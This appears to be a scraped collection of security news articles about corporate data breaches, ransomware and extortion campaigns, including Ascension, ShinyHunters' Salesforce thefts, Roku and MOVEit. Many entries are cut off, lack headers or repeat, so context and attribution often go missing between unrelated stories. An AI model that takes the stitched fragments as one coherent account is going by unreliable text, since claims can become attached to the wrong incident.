Ascension: Health data of 5.6 million stolen in ransomware attack,https://www.bleepingcomputer.com/news/security/ascension-health-data-of-56-million-stolen-in-ransomware-attack/#comments,Sergiu Gatlan,"December 20, 2024","​Ascension, one of the largest private U.S. healthcare systems, is notifying nearly 5.6 million patients and employees that their personal and health data was stolen in a May cyberattack linked to the Black Basta ransomware operation. The health network reported a total revenue of $28.3 billion in 2023 and operates 140 hospitals and 40 senior care facilities across the United States. The company now mails data breach notifications to 5,599,699 affected individuals via the United States Postal Service. Starting Thursday, December 19, Ascension also offers affected people 24 free months of IDX identity theft protection services, including CyberScan monitoring and a $1,000,000 insurance reimbursement policy. Ascension says it notified law enforcement and government partners, such as CISA and the FBI, of the breach after detecting the May 8 attack. ""Upon discovering the unauthorized activity, we initiated an investigation with the assistance of leading cybersecurity experts,"" Ascension states in the breach notification letters . ""Through this investigation, we found evidence that on May 7 and 8, a cybercriminal obtained a copy of certain files containing personal information of our patients and associates."" Since the breach, Ascension's investigation has revealed that some of the stolen files contained patients' and employees' names and information across one or more of the following categories (the specific type of exposed information varies from one individual to another): After the incident, Ascension revealed that the ransomware breach was caused by an employee who downloaded a malicious file onto a company device. However, it believes this was likely an ""honest mistake,"" given that the employee thought they were downloading a legitimate file. The ransomware attack impacted Ascension's MyChart electronic health records system, phones, and systems for ordering tests, procedures, and medications. It also forced the healthcare giant to take some devices offline on May 8 to contain what it initially described as a ""cyber security event."" Following the incident, Ascension employees had to keep track of procedures and medications on paper, as they could no longer access patients' electronic records. The company also had to pause some non-emergent elective procedures, tests, and appointments and divert emergency medical services to other healthcare units to prevent triage delays. While the healthcare giant has yet to link the May attack to a ransomware operation, CNN linked the Black Basta cybercrime gang to the incident (the ransomware group has yet to add Ascension to its data leak site). Days after the breach, the Health Information Sharing and Analysis Center (Health-ISAC) also warned that Black Basta ""has recently accelerated attacks against the healthcare sector."" Since the operation emerged in April 2022, Black Basta has breached the networks of many high-profile victims, including German defense contractor Rheinmetall , outsourcing giant Capita , U.S. government contractor ABB , and the Toronto Public Library . Joint research from Elliptic and Corvus Insurance shows that the ransomware gang collected over $100 million from more than 90 victims until November 2023.

They're also the owner of BreachForums, a notorious online community trafficking in the sale and leaking of stolen data which has survived several law enforcement takedowns over the past couple of years Two weeks ago, Spain's largest bank, Santander, disclosed a data breach after detecting unauthorized access to a database hosted by a third-party provider. The company's investigation determined that the threat actor accessed data for employees and customers in Chile, Spain, and Uruguay. ""Following an investigation, we have now confirmed that certain information relating to customers of Santander Chile, Spain and Uruguay, as well as all current and some former Santander employees of the group had been accessed,"" reads a statement from Santander . ""Customer data in all other Santander markets and businesses are not affected."" Fast forward two weeks, and as first spotted by Dark Web Informer , ShinyHunters is now claiming to sell the data for Santander customers in Chile, Spain, and Uruguay for $2 million, the same data the bank reported was stolen. ShinyHunters claims that the stolen data contains the personal information of 30 million customers and employees, 28 million credit card numbers, and 6 million account numbers and balances. As part of the sale listing, the threat actor also shared samples of the data that contains the listed information but cannot be confirmed to belong to Santander.

The attacks are believed to have begun at the start of the year, with the threat actors tricking employees into linking a malicious OAuth app to their company's Salesforce instance. Once connected, the attackers downloaded and stole company databases, later using the data to extort victims via email. These extortion demands were signed as coming from ShinyHunters, a well-known extortion group linked to a string of high-profile breaches over the years, including the Snowflake attacks and those against AT&T and PowerSchool . When contacted by BleepingComputer to confirm Have I Been Pwned's findings, an Allianz Life spokesperson couldn't ""offer any additional comment at this time"" because of an ongoing investigation. However, the spokesperson confirmed that ""some selected Allianz Life employees"" were also impacted by the breach. Update August 19, 08:47 EDT: Added Allianz Life statement. It's budget season!

Founded in 1984 in Barcelona, MANGO is a clothing and fashion accessories designer and manufacturer, operating physical and e-commerce stores in 2,800 locations across 120 countries. The company employs 16,300 people and has an annual revenue of €3.3 billion, of which approximately 30% comes from online purchases. On October 14, 2025, the company sent data breach notifications to its customers, informing them that personal data used in marketing campaigns had been compromised. ""MANGO wishes to inform you that one of the external marketing services has suffered unauthorized access to certain customers' personal data,"" reads the notice . The types of data exposed in this incident include a customer's first name, country, postal code, email address, and telephone number. MANGO specified that last names, banking information, credit card data, IDs, passports, or account credentials were not compromised in this incident. Although the absence of last names in the exposed data set lessens the risk, attackers can still use the remaining compromised data in phishing attacks. The company also noted that its corporate infrastructure and IT systems remain unaffected, and so business operations weren't impacted.

Google disputes false claims of massive Gmail data breach,https://www.bleepingcomputer.com/news/security/google-disputes-false-claims-of-massive-gmail-data-breach/,Lawrence Abrams,"October 27, 2025","Google was once again forced to announce that it had not suffered a data breach after numerous news outlets published sensational stories about a fake breach that purportedly exposed 183 million accounts. This claim began over the weekend and into today, with news stories claiming that millions of Gmail accounts were breached, with some outlets saying it affected the full 183 million accounts. However, as the company explained in a series of posts on Monday, Gmail did not suffer a breach, and the compromised accounts were actually from a compilation of credentials stolen by information-stealing malware and other attacks over the years. ""Reports of a 'Gmail security breach impacting millions of users' are false. Gmail's defenses are strong, and users remain protected,"" reads a post on X . ""The inaccurate reports are stemming from a misunderstanding of infostealer databases, which routinely compile various credential theft activity occurring across the web. It's not reflective of a new attack aimed at any one person, tool, or platform."" ""Several inaccurate claims surfaced recently that incorrectly stated that we issued a broad warning to all Gmail users about a major Gmail security issue. This is entirely false,"" Google added. This is just the latest such story that numerous news websites and cybersecurity companies have reported without verification in recent years. This particular story stems from Have I Been Pwned (HIBP) creator Troy Hunt announcing he recently added a massive collection of 183 million compromised credentials to the data breach notification platform shared by the threat intelligence platform Synthient. These credentials were not stolen in a single data breach, but rather through information-stealing malware, data breaches, credential stuffing, and phishing. Furthermore, these accounts are not for a single platform but for thousands, if not millions, of sites. Threat actors commonly collect exposed credentials and combine them into massive collections, which are then shared among the cybercrime community on Telegram channels, Discord servers, and hacking forums. After loading the data into HIBP, Hunt says 91% of the 183 million credentials had previously been seen, illustrating that many of them have been circulating for years. ""The final number once the entire data set was loaded into HIBP was 91% pre-existing, with 16.4M previously unseen addresses in any data breach, not just stealer logs,"" explained Hunt. Companies, including Google, commonly use collections like these to warn customers of exposed passwords and to force password resets to protect accounts. ""Gmail takes action when we spot large batches of open credentials, helping users reset passwords and resecure accounts,"" explained Google. While the claims of a Gmail data breach are false, that does not mean exposed credentials are harmless or should be ignored, as threat actors commonly use them to breach corporate networks and carry out devastating attacks. For example, the UnitedHealth Change Healthcare ransomware attack was caused by exposed Citrix credentials that enabled threat actors to gain initial network access. However, reports of unfounded data breaches do not help anyone and only cause undue stress and extra work for a platform's users and business customers. Just last month, Google had to state that it did not suffer a data breach after the same news sites claimed that 2.5 billion Gmail accounts had been compromised . While that claim stemmed from a Salesloft breach that impacted a small number of Google Workspace accounts , the story was quickly sensationalized into a much larger breach. If you are concerned that your credentials may have been part of the Synthient collection, you can register an account at Have I Been Pwned , open the dashboard, and click Stealer Logs to see if your account was compromised in the past by information-stealing malware. If you have accounts listed, perform an antivirus scan on your computer, then immediately change the passwords for all of your accounts.

Workiva, a leading cloud-based SaaS (Software as a Service) provider, notified its customers that attackers who gained access to a third-party customer relationship management (CRM) system stole some of their data. The company's cloud software helps collect, connect, and share data for financial reports, compliance, and audits. It had 6,305 customers at the end of last year and reported revenues of $739 million in 2024. Its customer list includes 85% of the Fortune 500 companies and high-profile clients such as Google, T-Mobile, Delta Air Lines, Wayfair, Hershey, Slack, Cognizant, Santander, Nokia, Kraft Heinz, Wendy's, Paramount, Air France KLM, Mercedes-Benz, and more. According to a private email notification sent to affected Workiva customers last week and seen by BleepingComputer, the threat actors exfiltrated a limited set of business contact information, including names, email addresses, phone numbers, and support ticket content. ""This is similar to recent events that have targeted several large organizations. Importantly, the Workiva platform and any data within it were not accessed or compromised,"" the company explained. ""Our CRM vendor notified us of unauthorized access via a connected third-party application."" Workiva also warned impacted customers to remain vigilant, as the stolen information could be used in spear-phishing attacks. ""Workiva will never contact anyone by text or phone to request a password or any other secure details. All communications from Workiva come through our trusted official support channels,"" it said. While Workiva didn't share more details regarding this attack, BleepingComputer has learned that this incident was part of the recent wave of Salesforce data breaches linked to the ShinyHunters extortion group that impacted many high-profile companies. Most recently, Cloudflare disclosed that it was forced to rotate 104 Cloudflare platform-issued tokens stolen by ShinyHunters threat actors, who gained access to the Salesforce instance used for customer support and internal customer case management in mid-August. ShinyHunters has been targeting Salesforce customers in data theft attacks using voice phishing (vishing) since the start of the year , impacting companies such as Google , Cisco , Allianz Life , Farmers Insurance , Workday , Qantas , Adidas , and LVMH subsidiaries, including Dior , Louis Vuitton , and Tiffany & Co. More recently, the extortion group has shifted to using stolen OAuth tokens for Salesloft's Drift AI chat integration with Salesforce to gain access to customer Salesforce instances and extract sensitive information, such as passwords, AWS access keys, and Snowflake tokens, from customer messages and support tickets. Using this method, ShinyHunters also gained access to a small number of Google Workspace accounts in addition to stealing Salesforce CRM data and breaching the Salesforce instances of multiple cybersecurity companies, including Zscaler , Tenable , CyberArk , Elastic , BeyondTrust , Proofpoint , JFrog , Nutanix , Qualys , Rubrik , Cato Networks , and Palo Alto Networks .

According to a private email notification sent to affected Workiva customers last week and seen by BleepingComputer, the threat actors exfiltrated a limited set of business contact information, including names, email addresses, phone numbers, and support ticket content. ""This is similar to recent events that have targeted several large organizations. Importantly, the Workiva platform and any data within it were not accessed or compromised,"" the company explained. ""Our CRM vendor notified us of unauthorized access via a connected third-party application."" Workiva also warned impacted customers to remain vigilant, as the stolen information could be used in spear-phishing attacks. ""Workiva will never contact anyone by text or phone to request a password or any other secure details. All communications from Workiva come through our trusted official support channels,"" it said. While Workiva didn't share more details regarding this attack, BleepingComputer has learned that this incident was part of the recent wave of Salesforce data breaches linked to the ShinyHunters extortion group that impacted many high-profile companies. Most recently, Cloudflare disclosed that it was forced to rotate 104 Cloudflare platform-issued tokens stolen by ShinyHunters threat actors, who gained access to the Salesforce instance used for customer support and internal customer case management in mid-August. ShinyHunters has been targeting Salesforce customers in data theft attacks using voice phishing (vishing) since the start of the year , impacting companies such as Google , Cisco , Allianz Life , Farmers Insurance , Workday , Qantas , Adidas , and LVMH subsidiaries, including Dior , Louis Vuitton , and Tiffany & Co. More recently, the extortion group has shifted to using stolen OAuth tokens for Salesloft's Drift AI chat integration with Salesforce to gain access to customer Salesforce instances and extract sensitive information, such as passwords, AWS access keys, and Snowflake tokens, from customer messages and support tickets. Using this method, ShinyHunters also gained access to a small number of Google Workspace accounts in addition to stealing Salesforce CRM data and breaching the Salesforce instances of multiple cybersecurity companies, including Zscaler , Tenable , CyberArk , Elastic , BeyondTrust , Proofpoint , JFrog , Nutanix , Qualys , Rubrik , Cato Networks , and Palo Alto Networks .

The company said the attackers used login information stolen from other online platforms to breach as many active Roku accounts as possible in credential stuffing attacks. In such attacks, the threat actors leverage automated tools to attempt millions of logins using a list of user/password pairs, with this technique being particularly effective against accounts whose owners have reused the same login information across multiple platforms. ""After concluding our investigation of [the] first incident, we [..] continued to monitor account activity closely [and] we identified a second incident, which impacted approximately 576,000 additional accounts,"" Roku said on Friday . ""There is no indication that Roku was the source of the account credentials used in these attacks or that Roku's systems were compromised in either incident."" ""In less than 400 cases, malicious actors logged in and made unauthorized purchases of streaming service subscriptions and Roku hardware products using the payment method stored in these accounts, but they did not gain access to any sensitive information, including full credit card numbers or other full payment information."" As BleepingComputer reported in March , threat actors are using credential stuffing attacks with Open Bullet 2 or SilverBullet cracking tools to compromise Roku accounts, which are then sold for as little as 50 cents on illegal marketplaces. The sellers also provide information on using the stolen accounts to make fraudulent purchases, including Roku streaming boxes, sound bars, light strips, and TVs. After discovering this second wave of credential stuffing attacks, Roku has reset the passwords for all impacted accounts and is notifying affected customers directly about the incident. The company will also refund and reverse charges for accounts where the attackers used the linked payment information to pay for Roku hardware products and streaming service subscriptions. Since the last incident, Roku has also added support for two-factor authentication (2FA) and has now enabled it by default for all customer accounts, even for those that these recent attacks have not impacted. Customers are also advised to choose strong and unique passwords for their accounts and alert Roku's customer support if they receive requests to share their credentials, update their payment details, or click suspicious links. Last month, Roku disclosed another data breach that impacted an additional 15,363 customers of a total of over 80 million active users after their accounts were also used to make fraudulent purchases of streaming subscriptions and Roku hardware.

""We became aware that a third party service provider engaged by numerous merchants experienced unauthorized access to its system,"" explains the data breach notification. ""Account information of some of our Card Members, including some of your account information, may have been involved. It is important to note that American Express owned or controlled systems were not compromised by this incident, and we are providing this notice to you as a precautionary measure."" The breach has led to customers' American Express Card account numbers, names, and card expiration data being accessed by the hackers. It is unclear how many customers were impacted, what merchant processor was breached, and when the attack occurred. When BleepingComputer asked American Express for more information about the breach, we were told that they do not disclose details of their business relationships and merchant partners and had no further information to share at this time. However, American Express did say that they have notified the required regulatory authorities and are alerting impacted customers.

The company also suggests customers enable instant notifications via the American Express mobile app to receive notifications about fraud alerts and when purchases are made.

Last month, Allianz Life disclosed that it suffered a data breach when the personal information for the ""majority"" of its 1.4 million customers was stolen from a third-party, cloud-based CRM system on July 16th. While the company did not name the provider, BleepingComputer first reported the incident was part of a wave of Salesforce-targeted thefts carried out by the ShinyHunters extortion group. Over the weekend, ShinyHunters and other threat actors claiming overlap with ""Scattered Spider"" and ""Lapsus$"" created a Telegram channel called "" ScatteredLapsuSp1d3rHunters"" to taunt cybersecurity researchers, law enforcement, and journalists while taking credit for a string of high-profile breaches. Many of these attacks had not previously been attributed to any threat actor, including the attacks on Internet Archive , Pearson , and Coinbase . One of the attacks claimed by the threat actors is Allianz Life, for which they proceeded to leak the complete databases that were stolen from the company's Salesforce instances. These files consist of the Salesforce "" Accounts "" and "" Contacts "" database tables, containing approximately 2.8 million data records for individual customers and business partners, such as wealth management companies, brokers, and financial advisors. The leaked Salesforce data includes sensitive personal information, such as names, addresses, phone numbers, dates of birth, and Tax Identification Numbers, as well as professional details like licenses, firm affiliations, product approvals, and marketing classifications. BleepingComputer has been able to confirm with multiple people that their data in the leaked files is accurate, including their phone numbers, email addresses, tax IDs, and other information contained in the database. BleepingComputer contacted Allianz Life about the leaked database but was told that they could not comment as the investigation is ongoing. The Salesforce data theft attacks are believed to have started at the beginning of the year, with the threat actors conducting social engineering attacks to trick employees into linking a malicious OAuth app with their company's Salesforce instances. Once linked, the threat actors used the connection to download and steal the databases, which were then used to extort the company through email. Extortion demands were sent to the companies via email and were signed as coming from ShinyHunters. This notorious extortion group has been linked to many high-profile attacks over the years, including those against AT&T , PowerSchool , and the SnowFlake attacks . While ShinyHunters is known to target cloud SaaS applications and website databases, they are not known for these types of social engineering attacks, causing many researchers and the media to attribute some of the Salesforce attacks to Scattered Spider. However, ShinyHunters told BleepingComputer the ""ShinyHunters"" group and ""Scattered Spider"" are now one and the same. ""Like we have said repeatedly already, ShinyHunters and Scattered Spider are one and the same,"" ShinyHunters told BleepingComputer. ""They provide us with initial access and we conduct the dump and exfiltration of the Salesforce CRM instances. Just like we did with Snowflake."" It is also believed that many of the group's members share their roots in another hacking group known as Lapsus$, which was responsible for numerous attacks in 2022-2023, before some of their members were arrested . Lapsus$ was behind breaches at Rockstar Games , Uber , 2K , Okta , T-Mobile , Microsoft , Ubisoft , and NVIDIA . Like Scattered Spider, Lapsus$ was also adept at social engineering attacks and SIM swap attacks, allowing them to run over billion and trillion-dollar companies' IT defenses.

""If so, the City will work to confirm the identities and contact information for potentially impacted individuals and provide notice via written letter."" City officials also urged individuals who may have been affected to stay vigilant against financial fraud attempts and potential incidents of identity theft. They advised monitoring credit reports and account statements closely, enabling individuals to promptly inform their insurance company, healthcare provider, or bank about any suspicious activity.

While the investigation and a manual review of the affected email accounts are still ongoing, the City revealed that the types of information exposed for impacted individuals include a combination of: ""In an abundance of caution, we are conducting a comprehensive, programmatic and manual review of the potentially impacted email accounts to determine whether personal information or protected health information was potentially affected,"" the notice says. ""If so, the City will work to confirm the identities and contact information for potentially impacted individuals and provide notice via written letter."" City officials also urged individuals who may have been affected to stay vigilant against financial fraud attempts and potential incidents of identity theft. They advised monitoring credit reports and account statements closely, enabling individuals to promptly inform their insurance company, healthcare provider, or bank about any suspicious activity. City officials are yet to provide details on how the attackers breached the City's email accounts and the reasons behind the delay in disclosing the incident for five months. As reported by The Philadelphia Inquirer , the City's Department of Behavioral Health and Intellectual Disability Services (DBHIDS) also disclosed a HIPAA breach in June 2020 after the personal health information of individuals it served was compromised following a March phishing attack. A breach notice revealed that the email accounts of DBHIDS and Community Behavioral Health employees were hacked in the phishing attack and were accessed by the attackers between March 31 and November 15, 2020.

Customer personally identifiable information (PII) exposed in the security breach includes the affected individuals' names, addresses, social security numbers, dates of birth, and financial information, including account and credit card numbers, according to details shared with the Attorney General of Texas. Bank of America serves approximately 69 million clients at over 3,800 retail financial centers and through approximately 15,000 ATMs in the United States, its territories, and more than 35 countries. A Bank of America spokesperson declined to comment when BleepingComputer reached out for more details and asked us to connect with Infosys McCamish. While Bank of America has yet to disclose how many customers were impacted by the data breach, an IMS breach notification letter filed with the Attorney General of Maine on behalf of Bank of America revealed that a total of 57,028 people were directly impacted.

On November 4th, the LockBit ransomware gang claimed responsibility for the IMS attack , saying that its operators encrypted over 2,000 systems during the breach. The LockBit ransomware-as-a-service (RaaS) operation came to light in September 2019 and has since targeted many high-profile organizations, including the UK Royal Mail , the Continental automotive giant , the City of Oakland , and the Italian Internal Revenue Service . In June, cybersecurity authorities in the United States and partners worldwide released a joint advisory estimating that the LockBit gang has extorted at least $91 million from U.S. organizations following roughly 1,700 attacks since 2020. Infosys, IMS' parent company, is a multinational IT consulting and services provider giant with over 300,000 employees and clients in over 56 countries. An Infosys spokesperson has yet to respond to a BleepingComputer request for confirmation of LockBit's claims and further information about the security breach.

ShinyHunters launches Salesforce data leak site to extort 39 victims,https://www.bleepingcomputer.com/news/security/shinyhunters-starts-leaking-data-stolen-in-salesforce-attacks/#comment_form,Sergiu Gatlan,"October 3, 2025","An extortion group has launched a new data leak site to publicly extort dozens of companies impacted by a wave of Salesforce breaches , leaking samples of data stolen in the attacks. The threat actors responsible for these attacks claim to be part of the ShinyHunters, Scattered Spider, and Lapsus$ groups, collectively referring to themselves as ""Scattered Lapsus$ Hunters."" Today, they launched a new data leak site containing 39 companies impacted by the attacks. Each entry includes samples of data allegedly stolen from victims' Salesforce instances, and warns the victims to reach out to ""prevent public disclosure"" of their data before the October 10 deadline is reached. The companies being extorted on the data leak site include well-known brands and organizations, including FedEx, Disney/Hulu, Home Depot, Marriott, Google, Cisco, Toyota, Gap, McDonald's, Walgreens, Instacart, Cartier, Adidas, Sake Fifth Avenue, Air France & KLM, Transunion, HBO MAX, UPS, Chanel, and IKEA. ""All of them have been contacted long ago, they saw the email because I saw them download the samples multiple times. Most of them chose to not disclose and ignore,"" ShinyHunters told BleepingComputer. ""We highly advise you proceed into the right decision, your organisation can prevent the release of this data, regain control over the situation and all operations remain stable as always. We highly recommend a decision-maker to get involved as we are presenting a clear and mutually beneficial opportunity to resolve this matter,"" they warned on the leak site. The threat actors also added a separate entry requesting that Salesforce pay a ransom to prevent all impacted customers' data (approximately 1 billion records containing personal information) from being leaked. ""Should you comply, we will withdraw from any active or pending negotiation indiviually from your customers. Your customers will not be attacked again nor will they face a ransom from us again, should you pay,"" they added. The extortion group also threatened the company, stating that it would help law firms pursue civil and commercial lawsuits against Salesforce following the data breaches and warned that the company had also failed to protect customers' data as required by the European General Data Protection Regulation (GDPR). Scattered Lapsus$ Hunters have been targeting Salesforce customers with voice phishing attacks since the beginning of the year , leading to breaches that have impacted companies such as Google , Cisco , Qantas , Adidas , Allianz Life , Farmers Insurance , Workday , as well as LVMH subsidiaries, including Dior , Louis Vuitton , and Tiffany & Co . In these attacks, the threat actors tricked employees into linking a malicious OAuth app to their company's Salesforce instance. ShinyHunters told BleepingComputer that while a particular Salesforce instance may have been targeted, it also contained data for many of the subsidiaries, making the attacks more impactful. Once connected, the attackers stole company databases and used the data to extort victims via email. These extortion emails were signed by ShinyHunters, a notorious extortion group linked to a long string of high-profile breaches in recent years, including the Snowflake attacks and those against AT&T and PowerSchool . ShinyHunters also claimed to have used stolen OAuth tokens for Salesloft's Drift AI chat integration with Salesforce to steal sensitive information, including passwords, AWS access keys, and Snowflake tokens, from customers' Salesforce instances. These attacks were tracked by Mandiant under a separate threat cluster named ""UNC6395"" as they have been unable to formally link the breaches to this group. On a Telegram channel associated with the extortion group, the threat actors claim that they will begin extorting companies affected by the Salesloft Drift attacks on a separate data leak site launching on October 10th. ShinyHunters previously told BleepingComputer that the Salesloft data theft attacks impacted approximately 760 companies and resulted in the theft of 1.5 billion Salesforce records . The Salesloft attacks are known to have impacted Google , Palo Alto Networks , CyberArk , Cloudflare , Rubrik , Elastic , BeyondTrust , Proofpoint , JFrog , Zscaler , Tenable , Nutanix , Qualys , and Cato Networks , among many others . ShinyHunters claim that companies will not be re-extorted under the Salesloft campaign if a ransom is paid in this initial extortion phase. ""We are aware of recent extortion attempts by threat actors, which we have investigated in partnership with external experts and authorities. Our findings indicate these attempts relate to past or unsubstantiated incidents, and we remain engaged with affected customers to provide support,"" Salesforce said in a statement published after ShinyHunters launched their data leak site.

The company says that the cyberattack impacted only customers who made purchases from the Samsung UK online store between July 1, 2019, and June 30, 2020. Samsung discovered the data breach two days ago, on November 13, and determined that it was the result of a hacker exploiting a vulnerability in a third-party application the company used. No details have been provided about the security issue leveraged in the attack or the vulnerable application that enabled the attacker to access Samsung customer's personal information. The notification to customers says that exposed data may include names, phone numbers, postal and email addresses. The company underlines that credentials or financial information remains unaffected by the incident. A Samsung spokesperson told BleepingComputer that the company was recently alerted of a cybersecurity incident that is limited to the UK region and does not affect data belonging to customers in the U.S., employees, or retailers. “We were recently alerted to a cybersecurity incident, which resulted in certain contact information of some Samsung UK e-store customers being unlawfully obtained. No financial data, such as bank or credit card details, or customer passwords, were impacted. The incident is limited to the UK and does not affect U.S. customers, employees or retailer data” - Samsung The company has taken all necessary steps to address the security issue, the representative told BleepingComputer, adding that the incident has also been reported to the UK’s Information Commissioner’s Office. This is the third data breach Samsung has suffered in two years. The previous one occurred in late July , 2022 - discovered on August 4, when hackers accessed and stole Samsung customers' names, contacts and demographic information, dates of birth, and product registration data. In March 2022, the data extortion group Lapsus$ breached Samsung’s network and stole confidential information, including source code for Galaxy smartphones.

Caesars discovered on September 7th that the attackers stole its loyalty program database, which stores driver's license numbers and social security numbers for many customers. ""We are still investigating the extent of any additional personal or otherwise sensitive information contained in the files acquired by the unauthorized actor,"" says an 8-K form filed by Caesars with the U.S. Securities and Exchange Commission on Thursday. ""We have no evidence to date that any member passwords/PINs, bank account information, or payment card information (PCI) were acquired by the unauthorized actor."" Caesars' 8-K also implies that a ransom demanded by the attackers was paid to prevent the leak of the stolen data online—a Wall Street Journal report says the hotel and casino entertainment company paid roughly $15 million, half of the attackers' initial $30 million demand. Nonetheless, Caesars made it clear that it cannot provide any assurances regarding the potential actions of the threat actors responsible for the incident, including the possibility that they might still sell or leak the customer's stolen information. ""We have taken steps to ensure that the stolen data is deleted by the unauthorized actor, although we cannot guarantee this result,"" Caesars said. ""We are monitoring the web and have not seen any evidence that the data has been further shared, published, or otherwise misused."" While Caesars didn't link the attack to a specific cybercrime gang or threat actor, a Bloomberg report published on Wednesday claims the attack was conducted by a group known as Scattered Spider . Also tracked as UNC3944 and 0ktapus, this financially motivated threat group has been active since at least May 2022. It uses a combination of social engineering, multi-factor authentication (MFA) fatigue, and SMS credential phishing attacks to steal user credentials and breach targets' networks. According to Caesars, customers not enrolled in Caesars' loyalty program were not impacted by the data breach. The company will notify all affected individuals over the coming weeks. The company said in a separate data breach notification with additional details that it reported the incident to law enforcement. It also added that the attack has not impacted its customer-facing operations, including online/mobile gaming apps and physical properties, as they operate without disruption. Caesars is the second casino chain impacted by a cyberattack recently, with MGM Resorts International disclosing on Monday that it was forced to take its IT systems offline following a cyberattack that affected its websites, reservation systems, and casino services (i.e., ATMs, slot machines, and credit card machines). In 2020, MGM Resorts also disclosed a 2019 cyberattack that led to the breach of its cloud services, allowing the hackers to steal over 10 million customer records .

Associated Press warns that AP Stylebook data breach led to phishing attack,https://www.bleepingcomputer.com/news/security/associated-press-warns-that-ap-stylebook-data-breach-led-to-phishing-attack/#comments,Lawrence Abrams,"September 10, 2023","The Associated Press is warning of a data breach impacting AP Stylebook customers where the attackers used the stolen data to conduct targeted phishing attacks. The AP Stylebook is a commonly used guide on grammar, punctuation, and writing style for journalists, magazines, and newsrooms worldwide. This week, the Associated press warns that an old third-party-managed AP Stylebook site that was no longer in use was hacked between July 16 and July 22, 2023, allowing the data for 224 customers to be stolen. The stolen information includes a customer's name, email address, street address, city, state, zip code, phone number, and User ID. For customers who entered tax-exempt IDs, such as a Social Security Number or Employer Identification Number, those IDs were stolen as well. The AP says they first learned of the possible data breach on July 20, 2023, after AP Stylebook customers reported receiving phishing emails stating they needed to update their credit card information. After learning of the phishing attack, the AP took the old site and phishing offline to prevent further attacks. At the end of July, the company began alerting AP Stylebook customers of the phishing attacks, warning that the emails came from 'support@getscore.my[.]id' with a subject similar to ""Regarding AP Stylebook Order no. 07/20/2023 06:48:20 am."" The Associated Press also requires all AP Stylebook customers to reset their passwords on the next login. While this was not a significant data breach, with only 224 customers impacted, the login credentials for journalists and media companies are highly sought after by cybercriminals. Gaining access to the network of a media company could lead to a wide variety of attacks, including extortion and ransomware attacks, data theft, and cyber espionage. In the past, local and global media outlets suffered ransomware and cyberespionage attacks, including News Corp , the Philadelphia Inquirer , and German newspaper Heilbronn Stimme .

On October 10, the attack was claimed by the Underground ransomware gang, which threatened to disclose confidential documents, financial files, project information, and employee data unless a ransom was paid. Soon after, Casio confirmed that Underground had stolen the personal data of employees, partners, and customers. However, the company did not provide the number of affected people. With the investigation now completed, Casio is in a position to give the full details of the data breach scope. The latest announcement from the company lists the following exposed data: As impacted individuals are identified, they will receive personalized notices about the incident from Casio. Although some employees received unsolicited emails believed to be linked to the ransomware incident and sensitive data exposure, the company says there has been no secondary damage to them, their partners, or customers as of yet. Casio specified that no customer data or credit card information had been exposed to Underground ransomware, as their databases holding customer information were not impacted by this incident. The Japanese firm also made it clear that they did not negotiate with the cybercriminals. ""Following consultation with law enforcement agencies, outside counsel and security experts, Casio has not responded to any unreasonable demands from the ransomware group that carried out the unauthorized access,"" explains Casio .

In a breach notification letter filed with the Office of the California Attorney General, Clearinghouse said that attackers gained access to its MOVEit managed file transfer (MFT) server on May 30 and stole files containing a wide range of personal information. ""On May 31, 2023, the Clearinghouse was informed by our third-party software provider, Progress Software, of a cybersecurity issue involving the provider's MOVEit Transfer solution,"" NSC said. ""After learning of the issue, we promptly initiated an investigation with the support of leading cybersecurity experts. We have also coordinated with law enforcement."" The personally identifiable information (PII) contained in the stolen documents includes names, dates of birth, contact information, Social Security numbers, student ID numbers, and some school-related records (e.g., enrollment records, degree records, and course-level data). According to the data breach notification letters, the data exposed in the attack varies for each affected individual. The complete list of educational organizations affected by this massive data breach can be found here . NSC provides educational reporting, data exchange, verification, and research services to roughly 22,000 high schools and around 3,600 colleges and universities. The organization says its participants enroll roughly 97% of students in public and private institutions. In August, NSC revealed in a data breach filing with the Office of Maine’s attorney general that over 51,500 people were impacted in the incident. The Clop ransomware gang is responsible for the extensive data-theft attacks that started on May 27, leveraging a zero-day security flaw in the MOVEit Transfer secure file transfer platform. Starting June 15, the cyber criminals began extorting organizations that fell victim to the attacks, exposing their names on the group's dark web data leak site. The fallout from these attacks is anticipated to impact hundreds of organizations globally, with many already notifying affected customers over the past four months. Despite the widespread potential victim pool, estimates from Coveware suggest that only a limited number are likely to yield to Clop's ransom demands. Nonetheless, the cybercrime gang is expected to collect an estimated $75-100 million in payments due to the high ransom requests. Reports have also revealed that multiple U.S. federal agencies and two U.S. Department of Energy (DOE) entities have fallen prey to these data theft and extortion attacks.

In June, Google warned that a threat actor they classify as 'UNC6040' is targeting companies' employees in voice phishing (vishing) social engineering attacks to breach Salesforce instances and download customer data. This data is then used to extort companies into paying a ransom to prevent the data from being leaked. In a brief update to the article last night, Google said that it too fell victim to the same attack in June after one of its Salesforce CRM instances was breached and customer data was stolen. ""In June, one of Google's corporate Salesforce instances was impacted by similar UNC6040 activity described in this post.

In a conversation with BleepingComputer yesterday, ShinyHunters claimed to have breached many Salesforce instances, with attacks still ongoing. The threat actor claimed yesterday to BleepingComputer that they breached a trillion-dollar company, and were considering just leaking the data rather than attempting to extort them. It is unclear if this company is Google. As for the other companies impacted in these attacks, the threat actor is extorting them through email, demanding they pay a ransom to prevent the data from being publicly leaked. Once the threat actor has finished privately extorting companies, they plan to publicly leak or sell data on a hacking forum. BleepingComputer has learned of one company that has already paid 4 Bitcoins, or approximately $400,000, to prevent the leak of their data.

New fake Ledger data breach emails try to steal crypto wallets,https://www.bleepingcomputer.com/news/security/new-fake-ledger-data-breach-emails-try-to-steal-crypto-wallets/,Lawrence Abrams,"December 17, 2024","A new Ledger phishing campaign is underway that pretends to be a data breach notification asking you to verify your recovery phrase, which is then stolen and used to steal your cryptocurrency. Ledger is a hardware cryptocurrency wallet that allows you to store, manage, and sell cryptocurrency. The funds in these wallets are secured using 24-word recovery phrases or 12 and 18-word phrases generated by other wallets. Anyone who knows your Ledger recovery phrase can use it to access the funds within the wallet. Therefore, recovery phrases must always be kept offline and never shared with anyone to prevent cryptocurrency funds from being stolen. Ledger has long been a target of phishing campaigns that attempt to steal users' recovery phrases or push fake Ledger Live software to steal information. These campaigns became significantly worse after Ledger suffered a data breach in 2020 that exposed its customers' names, addresses, phone numbers, and email addresses. However, over the past few days, multiple people have notified BleepingComputer or shared on X that they received a Ledger phishing email that pretends to be a new data breach notification. The phishing emails have the subject of ""Security Alert: Data Breach May Expose Your Recovery Phrase"" and appear to be from ""Ledger <support@ledger.com"". However, they are actually sent through the SendGrid email marketing platform. The phishing emails claim that Ledger suffered a data breach and that some recovery phrases have been exposed. The email then goes on to say that the user must verify their recovery phrase on Ledger's official verification page. 